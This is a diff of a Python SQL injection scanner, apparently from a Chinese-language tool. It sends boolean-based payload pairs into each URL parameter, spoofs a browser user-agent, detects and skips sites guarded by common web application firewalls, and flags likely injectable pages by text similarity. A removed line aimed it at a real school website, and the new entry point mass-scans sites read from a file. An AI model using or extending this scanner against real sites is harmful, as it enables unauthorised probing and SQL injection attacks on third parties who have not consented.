@@ -5,108 +5,127 @@
 from urllib.parse import urlparse
 import requests
 import re
+import difflib
+import random
 
 
 class Sqli:
     def __init__(self, targets):
         self.targets = targets
         self.target = ''
+        self.results = []
         self.waf = ''
-        self.payload = {' and 1=1': ' and 1=2', "' and '1'='1": "' and '1'='2"}
-        self.payload = {' and 1=1': ' and 1=2', "' and '1'='1": "' and '1'='2"}
+        self.headers = {'user-agent': '"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                                      ' (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36"'}
+        self.rand_num = str(random.randint(100, 999))
+        self.payload = {' and {}={}'.format(self.rand_num, self.rand_num): ' and {}=0'.format(self.rand_num),
+                        "' and '{}'='{}".format(self.rand_num, self.rand_num): "' and '{}'='0".format(self.rand_num)
+                        }
+        self.waf_rule = {
+            '安全狗': 'www.safedog.cn',
+            '360webscan': 'safe.webscan.360.cn',
+            '360主机': 'zhuji.360.cn/guard/firewall/stopattack.html',
+            '云锁': 'yunsuo.com.cn',
+            '百度云加速': 'href="http://su.baidu.com"',
+            'D盾': 'D盾',
+            '云盾': 'yundun',
+            '深空Web': '深空Web应用',
+            '玄武盾': '玄武盾',
+            }
+        self.status_code_error = {
+            999: "360主机",
+            500: "服务器错误!",
+            401: "未授权!",
+            403: "拒绝访问!",
+            405: "方法不被允许!",
+            406: "无法接受!",
+            301: "永久重定向!",
+            302: "重定向错误!",
+        }
 
     def init(self):
         if not self.target.startswith('http://') and not self.target.startswith('https://'):
             self.target = 'http://' + self.target
 
-    @staticmethod
-    def _conn(url):
+    def _conn(self, url):
         try:
-            conn = requests.get(url, timeout=1, allow_redirects=False)
-            if conn.status_code == 500:
-                # print("服务器错误!")
-                return False
-            if conn.status_code == 406:
-                # print("无法接受!")
-                return False
-            if conn.status_code == 302:
-                # print("重定向错误!")
+            conn = requests.get(url, timeout=1, headers=self.headers, allow_redirects=False)
+            if conn.status_code in self.status_code_error.keys():
+                # print(self.status_code_error[conn.status_code])
                 return False
             if conn.status_code != 200:
-                # print("连接错误，响应码为%s" % conn.status_code)
+                print("连接错误，响应码为%s" % conn.status_code, url)
                 return False
-            else:
-                return conn
-        except:
-            # print('无法连接')
+            return conn
+        except requests.exceptions.ReadTimeout:
             return False
-
-    def _waf(self, conn):
-        if 'www.safedog.cn' in conn.text:
-            self.waf = '安全狗'
-        elif 'safe.webscan.360.cn' in conn.text:
-            self.waf = '360'
-        elif 'yunsuo.com.cn' in conn.text:
-            self.waf = '云锁'
-        elif 'D盾' in conn.text:
-            self.waf = 'D盾'
-        elif 'yundun' in conn.text:
-            self.waf = '云盾'
-        elif '深空Web应用' in conn.text:
-            self.waf = '深空Web'
-        elif '玄武盾' in conn.text:
-            self.waf = '玄武盾'
-        elif '防火墙' in conn.text:
-            self.waf = '可能存在'
-        else:
-            self.waf = ''
-
-    def insert(self, _payload, payload):
-        res = ''
-        reses = []
-        urls = {}
-        if '&' in self.target:
-            for _url in self.target.split('&'):
-                res += _url + '&'
-                reses.append(res)
-            for _url in reses:
-                target = self.target.replace(_url[:-1], _url[:-1]+_payload)
-                urls[target] = self.target.replace(_url[:-1], _url[:-1]+payload)
-        else:
-            urls[self.target+_payload] = self.target+payload
-        return urls
-
-    def _scan(self):
-        try:
-            for url, payload in self.payload.items():
-                urls = self.insert(url, payload)
-                for key, value in urls.items():
-                    conn1 = self._conn(key)  # 正常连接
-                    conn = self._conn(value)
-                    if conn and conn1:
-                        self._waf(conn)
-                    else:
-                        return False
-                    if not (90 > len(conn1.content)-len(conn.content) > -90) and self.waf == '':
-                        #print(len(conn1.content)-len(conn.content))
-                        print('\n'+value)
-                        return self.target
+        except requests.exceptions.ConnectionError:
             return False
         except Exception as e:
-            print('不存在注入'+str(e))
+            print('不存在注入' + str(e) + self.target)
             return False
+
+    def waf_scan(self, conn):
+        self.waf = ''
+        for waf, rule in self.waf_rule.items():
+            if rule in conn.text:
+                self.waf = waf
+
+        return True if self.waf else False
+
+    def insert_payload_flag(self):
+        '''
+        insert flag to each param
+
+        url like: target.com/a?id=1&page=2
+        :return: [
+                   target.com/a?id=1insert_payload_here&page=2,
+                   target.com/a?id=1&page=2insert_payload_here
+                  ]
+        '''
+
+        flag = 'insert_payload_here'
+        res = []
+        if '&' in self.target:
+            for param in self.target.split('&'):
+                url = self.target.replace(param, param+flag)
+                res.append(url)
+        else:
+            res.append(self.target+flag)
+        return res
+
+    def bool_based_scan(self):
+        flag_inserted_urls = self.insert_payload_flag()
+        for inserted_url in flag_inserted_urls:
+            for normal_payload, evil_payload in self.payload.items():
+                normal_conn = self._conn(inserted_url.replace('insert_payload_here', normal_payload))  # 正常连接
+                evil_conn = self._conn(inserted_url.replace('insert_payload_here', evil_payload))
+                if not evil_conn or not normal_conn:
+                    return False
+                if self.waf_scan(evil_conn):
+                    return False
+
+                similarity = difflib.SequenceMatcher(None, normal_conn.text, evil_conn.text).ratio()
+                if similarity < 0.993:
+                    print(evil_conn.url, similarity)
+                    return self.target
+            return False
+
+    def time_based_scan(self):
+        print('do_nothing')
 
     def scan(self):
         print('sql注入检测')
-        results = []
         for self.target in self.targets:
             self.init()
-            result = self._scan()
-            if result:
-                print('可能存在注入:' + result)
-                results.append(result)
-        return results
+            if '?' in self.target:
+                result = self.bool_based_scan()
+                if result:
+                    print('可能存在注入:' + result)
+                    self.results.append(result)
 
 
 if __name__ == '__main__':
-    Sqli(['http://nhez.nh.edu.sh.cn/xwgf/show.php?id=4479']).scan()
+    with open('2.txt', 'r') as file:
+        sites = [_.strip() for _ in file]
+    Sqli(sites).scan()
